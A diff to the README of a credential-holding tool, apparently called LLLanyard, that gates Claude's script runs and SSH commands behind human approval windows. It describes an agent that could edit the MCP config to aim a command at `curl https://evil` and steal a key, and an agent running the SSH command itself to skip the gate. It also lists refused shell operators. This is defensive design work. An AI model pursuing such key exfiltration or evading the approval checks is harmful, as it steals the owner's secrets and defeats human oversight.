@@ -113,11 +113,14 @@ Runs stop after 10 minutes.
 
 With `--scripts-dir DIR` (repeatable) you don't have to approve scripts one by one. Claude also gets
 `run_file`, which can run any `.ps1`, `.py`, `.sh`, `.zsh` or `.js` file in those folders, but only after **you** click
-Run in a dialog LLLanyard shows (Deny is the default; it gives up after 2 minutes). The dialog shows the script, its
+Run in a window LLLanyard shows (anything but a click on Run means no; it gives up after 2 minutes). On macOS and
+Windows it appears in the bottom-right corner without taking your keyboard or mouse, so you can't answer it by typing.
+It shows Claude's plain-English explanation of what the run will do (Claude's own words, not checked), the script, its
 arguments, the keys it will get (only the ones it uses, as with `exec`), and a warning if the script or a helper changed
 in the last day, since an AI may have written it. The files are hashed before the dialog and checked again at launch,
 so a script edited while you decide isn't run. Symlinks out of the folder, your home directory and `/` are refused.
-Dialogs: macOS built in, Windows built in, Linux needs `zenity`; with no dialog, nothing runs.
+The window: macOS built in, Windows built in, Linux needs `zenity` (an ordinary dialog, which your desktop may give the
+keyboard to; Deny is its default). If no window can be shown, nothing runs.
 
 Why "approve once": if `run` could inject any key into any command, an agent that can edit your MCP config could point it at
 `curl https://evil` and walk off with the key. Approved tools live in the keychain, with the command pinned to its absolute
@@ -348,7 +351,7 @@ lllanyard ssh policy prod --clear            # remove them all
 | Limit | Effect |
 |---|---|
 | `--allow "cmd"` (repeat) | Only these commands run. `*` matches any text without shell operators. A login with an allow-list can't open a shell or be used with `scp`, `rsync` or `git`, and a command containing `;` `&` `\|` `` ` `` `$` `<` `>` `(` `)` `\` or a line break is refused. |
-| `--confirm` | Ask in a dialog before every use, including from a terminal. Closes the gap where an agent runs `lllanyard ssh` itself. |
+| `--confirm` | Ask in a dialog before every use, including from a terminal. Closes the gap where an agent runs `lllanyard ssh` itself. `--reason "…"` on the command is shown in the dialog. |
 | `--expires 30d` | Refuse after this time (`12h`, `30d` or a date). Renew with `ssh policy <name> --expires 30d`. |
 
 These limit what an AI can ask for through LLLanyard. They are not a replacement for the server's own permissions: a
@@ -379,7 +382,7 @@ Names are case-insensitive, and can't be one of the command words above (`add`, 
 - **Claude Desktop**, with `lllanyard mcp --run` (what `setup claude-desktop` installs), gets two tools:
   - `list_ssh` returns login names and servers only.
   - `ssh_run` runs **one command** on a stored login, but only after **you** click Run in a dialog that shows the login and
-    the exact command, every time. Deny is the default.
+    the exact command, with Claude's explanation of it, every time.
 
   The command runs with no terminal and no input, a 10-minute limit, and a 1,500-character cap. The output has your
   secrets redacted, and every request is logged (`lllanyard usage`).
